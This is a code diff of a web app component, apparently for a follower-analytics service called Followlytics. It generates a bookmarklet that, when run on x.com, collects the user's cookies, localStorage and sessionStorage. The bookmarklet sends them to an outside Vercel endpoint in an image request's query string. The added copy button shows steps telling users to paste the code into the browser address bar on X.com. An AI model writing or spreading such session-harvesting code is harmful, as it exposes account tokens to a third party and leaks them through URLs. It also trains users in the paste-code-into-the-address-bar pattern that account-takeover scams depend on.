@@ -40,42 +40,81 @@ export default function XSessionCaptureUltraSimple() {
     
     const script = `
 javascript:(function(){
-  if(!window.location.hostname.includes('x.com')&&!window.location.hostname.includes('twitter.com')){
-    alert('❌ Please run this on x.com or twitter.com');
-    return;
+  try {
+    console.log('🔐 Followlytics X Session Capturer started...');
+    
+    if(!window.location.hostname.includes('x.com')&&!window.location.hostname.includes('twitter.com')){
+      alert('❌ Please run this on x.com or twitter.com\\nCurrent site: ' + window.location.hostname);
+      return;
+    }
+    
+    console.log('✅ On X.com/Twitter, extracting session data...');
+    
+    const cookies={};
+    document.cookie.split(';').forEach(cookie=>{
+      const[name,value]=cookie.trim().split('=');
+      if(name&&value)cookies[name]=value;
+    });
+    
+    const localStorage={};
+    try{
+      for(let i=0;i<window.localStorage.length;i++){
+        const key=window.localStorage.key(i);
+        if(key)localStorage[key]=window.localStorage.getItem(key);
+      }
+    }catch(e){console.log('localStorage access failed:',e);}
+    
+    const sessionStorage={};
+    try{
+      for(let i=0;i<window.sessionStorage.length;i++){
+        const key=window.sessionStorage.key(i);
+        if(key)sessionStorage[key]=window.sessionStorage.getItem(key);
+      }
+    }catch(e){console.log('sessionStorage access failed:',e);}
+    
+    const sessionData={
+      cookies,
+      localStorage,
+      sessionStorage,
+      userAgent:navigator.userAgent,
+      url:window.location.href,
+      timestamp:new Date().toISOString()
+    };
+    
+    console.log('📊 Session data extracted:', {
+      cookieCount: Object.keys(cookies).length,
+      localStorageCount: Object.keys(localStorage).length,
+      sessionStorageCount: Object.keys(sessionStorage).length
+    });
+    
+    if(Object.keys(cookies).length === 0) {
+      alert('⚠️ No cookies found. Make sure you are logged into X.com first!');
+      return;
+    }
+    
+    const payload = JSON.stringify({sessionData,userId:'${user.uid}'});
+    const url = 'https://followlytics-zeta.vercel.app/api/auth/capture-x-session-img?data=' + encodeURIComponent(payload);
+    
+    console.log('📤 Sending session data to Followlytics...');
+    
+    const img=new Image();
+    img.onload=function(){
+      console.log('✅ Session capture successful!');
+      alert('✅ X session captured successfully!\\n\\nYou can now return to Followlytics and run follower scans.');
+    };
+    img.onerror=function(){
+      console.log('❌ Session capture failed');
+      alert('❌ Session capture failed. Please try again or contact support.');
+    };
+    img.src=url;
+    
+    // Also show immediate feedback
+    alert('🔄 Capturing X session...\\nPlease wait for confirmation message.');
+    
+  } catch(error) {
+    console.error('❌ Bookmarklet error:', error);
+    alert('❌ Error: ' + error.message + '\\n\\nPlease try again or contact support.');
   }
-  
-  const cookies={};
-  document.cookie.split(';').forEach(cookie=>{
-    const[name,value]=cookie.trim().split('=');
-    if(name&&value)cookies[name]=value;
-  });
-  
-  const localStorage={};
-  for(let i=0;i<window.localStorage.length;i++){
-    const key=window.localStorage.key(i);
-    localStorage[key]=window.localStorage.getItem(key);
-  }
-  
-  const sessionStorage={};
-  for(let i=0;i<window.sessionStorage.length;i++){
-    const key=window.sessionStorage.key(i);
-    sessionStorage[key]=window.sessionStorage.getItem(key);
-  }
-  
-  const sessionData={
-    cookies,
-    localStorage,
-    sessionStorage,
-    userAgent:navigator.userAgent,
-    url:window.location.href,
-    timestamp:new Date().toISOString()
-  };
-  
-  const img=new Image();
-  img.onload=()=>alert('✅ X session captured! Return to Followlytics.');
-  img.onerror=()=>alert('❌ Capture failed. Please try again.');
-  img.src='https://followlytics-zeta.vercel.app/api/auth/capture-x-session-img?data='+encodeURIComponent(JSON.stringify({sessionData,userId:'${user.uid}'}));
 })();
     `.replace(/\s+/g, ' ').trim()
     
@@ -155,19 +194,56 @@ javascript:(function(){
                 <p className="text-sm text-gray-700 mb-2">
                   <strong>Drag this button to your bookmarks bar:</strong>
                 </p>
-                <a
-                  href={generateBookmarklet()}
-                  className="inline-block bg-green-600 hover:bg-green-700 text-white text-sm px-4 py-2 rounded cursor-move"
-                  onClick={(e) => {
-                    e.preventDefault()
-                    alert('Drag this button to your bookmarks bar instead of clicking it!')
-                  }}
-                >
-                  📥 X Session Capturer
-                </a>
-                <p className="text-xs text-gray-500 mt-1">
-                  Don't click - drag to bookmarks bar!
-                </p>
+                <div className="space-y-2">
+                  <a
+                    href={generateBookmarklet()}
+                    className="inline-block bg-green-600 hover:bg-green-700 text-white text-sm px-4 py-2 rounded cursor-move"
+                    onClick={(e) => {
+                      e.preventDefault()
+                      alert('Drag this button to your bookmarks bar instead of clicking it!')
+                    }}
+                  >
+                    📥 X Session Capturer
+                  </a>
+                  <p className="text-xs text-gray-500">
+                    Don't click - drag to bookmarks bar!
+                  </p>
+                  
+                  {/* Test button for debugging */}
+                  <div className="mt-2">
+                    <button
+                      onClick={() => {
+                        const script = generateBookmarklet()
+                        navigator.clipboard.writeText(script).then(() => {
+                          alert('📋 Bookmarklet copied to clipboard!\n\nYou can:\n1. Paste it in address bar on X.com\n2. Or manually create bookmark with this URL')
+                        }).catch(() => {
+                          // Fallback - show in popup
+                          const popup = window.open('', '_blank', 'width=600,height=400')
+                          if (popup) {
+                            popup.document.write(`
+                              <html>
+                                <head><title>Bookmarklet Code</title></head>
+                                <body style="font-family: Arial; padding: 20px;">
+                                  <h3>Copy this bookmarklet code:</h3>
+                                  <textarea style="width: 100%; height: 200px; font-family: monospace;" readonly onclick="this.select()">${script}</textarea>
+                                  <p><strong>Instructions:</strong></p>
+                                  <ol>
+                                    <li>Copy the code above</li>
+                                    <li>Go to X.com</li>
+                                    <li>Paste in address bar and press Enter</li>
+                                  </ol>
+                                </body>
+                              </html>
+                            `)
+                          }
+                        })
+                      }}
+                      className="text-blue-600 hover:text-blue-700 text-xs underline"
+                    >
+                      📋 Copy bookmarklet code
+                    </button>
+                  </div>
+                </div>
               </div>
             </div>
             
